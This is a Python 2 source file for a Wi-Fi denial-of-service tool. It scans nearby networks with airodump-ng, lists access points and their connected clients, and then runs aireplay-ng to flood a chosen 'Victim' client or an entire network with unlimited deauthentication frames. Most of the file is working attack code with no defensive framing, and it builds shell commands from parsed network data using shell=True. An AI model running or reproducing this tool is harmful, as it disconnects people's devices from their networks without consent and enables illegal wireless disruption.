import csv
import re
from termcolor import colored, cprint
from tabulate import tabulate
import subprocess
import time
import threading
import os
import sys 
import select
import functions
import termios

# Declare Global Variables
global airodump # will be used to kill the airodump thread
global victim # will be used to kill any existing attacks
global network_list_main
global client_list_main
client_list_main = []
network_list_main = []

# Create Target Class --> Holds data for a Target (aka Access Point aka Router)
class Target:
	def __init__(self, bssid, power, data, channel, encryption, ssid):
		self.bssid = bssid
		self.power = power
		self.data = data
		self.channel = channel
		self.encryption = encryption
		self.ssid = ssid
		self.wps = False  # Default to non-WPS-enabled router.
		self.key = ''
		self.clients = []
		self.num_clients = 0


# Create Client Class --> Holds data for a Client (device connected to Access Point/Router)
class Client:
	def __init__(self, bssid, station, power, channel):
		self.bssid = bssid
		self.station = station
		self.power = power
		self.channel = channel

# Sort list by power rating
def sort_network_list(temp_list):
	network_list = sorted(temp_list, key = lambda x: x[5], reverse = True) # sort list by power rating
	
	# sort numbers i.e. 1-10
	z=0
	j = 1
	while z <len(network_list):
		if network_list[z][0] == j:
			pass
		else:
			network_list[z][0] = j
		j+=1
		z+=1
		
	return(network_list)
	
# Sort Client List
def sort_client_list(temp_list,number):

	# sort numbers i.e. 1-10
	z=0
	j = number+1
	while z <len(temp_list):
		if temp_list[z][0] == j:
			pass
		else:
			temp_list[z][0] = j
		j+=1
		z+=1
		
	return(temp_list)

# Parse All Network Info
def create_network_table(targets,clients):
	
	# Define Variables
	global network_list_main
	associated_client_list = len(clients)
	total_networks = len(targets)
	network_list = []
	i = 0
	
	# Create Network Table
	while i < total_networks:
		j=0
		while j < associated_client_list:
			if clients[j].station == targets[i].bssid:
				targets[i].clients.append(clients[j].bssid)
				targets[i].num_clients +=1
				
				# **** Debugging **** #
				#print "	MATCH FOUND at " + repr(i+1) + str(targets[i].__dict__) + str(clients[j].__dict__)
				#print i+1
			j+=1
			
		network_info = [i+1,targets[i].ssid,targets[i].bssid,targets[i].channel,targets[i].encryption,targets[i].power,targets[i].wps,targets[i].num_clients]
		network_list.append(network_info)
		i+=1

	network_list = sort_network_list(network_list) # sort the list by power
	network_list_main = network_list # set global list equal so that it can be called from another function
	
	# Print the list
	print colored (30 * "-", 'cyan')
	print colored("Detected Wireless Network Table",'white',attrs=['bold'])
	print colored (30 * "-", 'cyan')
	print colored(tabulate(network_list, headers=['Number','ESSID','BSSID','Channel','Encryption','Power','WPS?','Client']),'yellow',attrs=['bold'])
	return

# Parse All Client Info
def create_client_table(targets,clients):
	global client_list_main
	# Define Variables
	associated_client_list = len(clients)
	total_networks = len(targets)
	client_list=[]
	i = 0
	
	# Create Client Table
	while i < total_networks:
		j= 0
		if len(targets[i].clients) > 0:
			temp = targets[i].clients
			for element in clients:
				if element.bssid in temp:
					client_info = [j+1,targets[i].ssid,clients[j].bssid,clients[j].station,clients[j].power,targets[i].channel]
					client_list.append(client_info)
				j+=1
		i+=1
		
	client_list_main = sort_client_list(client_list,len(targets)) # sort the list by power
	
	# Print Table
	print "\n"
	print colored (30 * "-", 'cyan')
	print colored("Networks With Active Clients",'white',attrs=['bold'])
	print colored (30 * "-", 'cyan')
	print colored(tabulate(client_list, headers=['Number','Client BSSID','Network ESSID','Client Station','Client Power']),'green',attrs=['bold'])
	return

# Format the data recieved from the airodump network sniff
def parse_network_info():
	global airodump
	# Declare Variables
	targets = [] # list to hold list of target networks discovered
	clients = [] # list to hold list of clients discovered
	hit_clients = False
	
	# Open CSV FIle and extract & format relevant information
	with open('ddd-01.csv', 'rb') as csvfile:
		targetreader = csv.reader((line.replace('\0', '') for line in csvfile), delimiter=',')
		for row in targetreader:
			if len(row) < 2:
				continue
			if not hit_clients:
				if row[0].strip() == 'Station MAC':
					hit_clients = True
					continue
				if len(row) < 14:
					continue
				if row[0].strip() == 'BSSID':
					continue
				enc = row[5].strip()
				wps = False
				
				# if statement to neaten encoding name
				if enc == "WPA2WPA" or enc == "WPA2 WPA":
					enc = "WPA2"
					wps = True # wps is active

				power = int(row[8].strip())
				ssid = row[13].strip()
				ssidlen = int(row[12].strip())
				ssid = ssid[:ssidlen]
				if power < 0: power += 100
				
				# create target instance and add it to the list
				t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
				t.wps = wps # enable wps in the instance
				targets.append(t) # add to list
				
			# Handle Clients Found
			else:
				if len(row) < 6:
					continue
				bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
				station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
				power = row[3].strip()
				if station != 'notassociated':
					c = Client(bssid, station, power, '')
					clients.append(c)

	# Pass on to display functions
	functions.system_clear() # clear screen, neatens the display for the user
	functions.banner() # print banner
	
	# check if airodump is still scanning for networks or not
	airodump_alive = airodump.poll()
	if airodump_alive == None:
		print colored ("\n[*] Scanning... Found " + repr(len(targets)) + " Networks, Clients " + repr(len(clients)) + " (press any key to stop scanning)", 'magenta',attrs=['bold'])
	else:
		print colored ("\n[*] Found " + repr(len(targets)) + " Networks, Clients " + repr(len(clients)) + "", 'magenta',attrs=['bold'])
	
	# call functions to handle the targets and clients tables
	create_network_table(targets,clients)
	create_client_table(targets,clients)
	
	return len(targets)

def launch_network_discovery(interface,restart_services):
	global airodump
	global client_list_main
	import os
	
	#Check if file exits and if so delete it
	filepath = os.getcwd()
	filepath = filepath + "/ddd-01.csv"
	filepath2 = "'" +filepath + "'"
	if os.path.exists(filepath):
		subprocess.Popen("rm " + filepath2, shell=True).wait()

	try:
		FNULL = open(os.devnull, 'w') # used to hide outp[ut from terminal display
		airodump = subprocess.Popen(['airodump-ng','wlan0', '--write-interval', '3', '-w','ddd',  '-o', 'csv'],stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=FNULL) # open airodump subprocess
		
		print colored ("\n[*] Searching For Wirless Networks", 'yellow',attrs=['bold']),
		print colored ("...", 'yellow',attrs=['bold','blink'])
		time.sleep(10)
		
		# while loop to display network info to the user
		while True:
			functions.system_clear()
			parse_network_info()
			print "\nEnter any key to stop scanning:"
			i, o, e = select.select( [sys.stdin], [], [], 3)
					
			# if statement to check if input as been recieved within 3 seconds
			if not (i):
				pass
			else:
				break
				
		# kill airodump process and wait for it to finish
		airodump.kill()
		airodump.wait()
		functions.system_clear()
		max_value = parse_network_info()
		max_value =  int(max_value) + len(client_list_main)
		choice = functions.user_input_integer(max_value)
		launch_attack(choice,interface,restart_services)
			
			
	except KeyboardInterrupt:
		functions.cleanup(interface,True,True,restart_services)



def launch_attack(number,interface,restart_services):
	global network_list_main
	global client_list_main
	global victim
	target = ''
	router = False
	
	# Check if user has selected a client or whole network
	client_index = len(network_list_main)+1
	user_option = number -  client_index
	
	# If user selected a client
	if number >= int(client_index):
		target = client_list_main[user_option][2]
		channel = client_list_main[user_option][5]
		functions.change_wireless_channel(channel,interface)
		print client_list_main[user_option]
	
	else:
		router = True
		target = network_list_main[(number-1)][1]
		channel = network_list_main[(number-1)][3]
		functions.change_wireless_channel(channel,interface)
			
		
	functions.system_clear()
	functions.banner()
	#print client_list_main[user_option][3] 
	#print client_list_main[user_option]
	print "Channel: " + channel
	print channel
	# Start Attack
	try:
		# If client
		if router == False:
			print colored ("\n[*]Initiating Deathentication For Victim: " + target + "\n",'magenta',attrs=['bold'])
			subprocess.Popen("aireplay-ng -0 0 -a " +  client_list_main[user_option][3] + " -c " + target + " " + interface, shell=True).wait()
			
		else:
			subprocess.Popen("aireplay-ng -0 0 -a " + network_list_main[(number-1)][2] + " " + interface, shell=True).wait()
				#os.system("aireplay-ng -0 0 -a " + network_list_main[(number-1)][2] + " " + interface)
	except Exception as (e):
		print colored("[!!] Error! Something Unexpected Happened",'red',attrs=['bold'])
		print str(e)
		time.sleep(3)
		functions.cleanup(interface,True,True,restart_services)
		




	
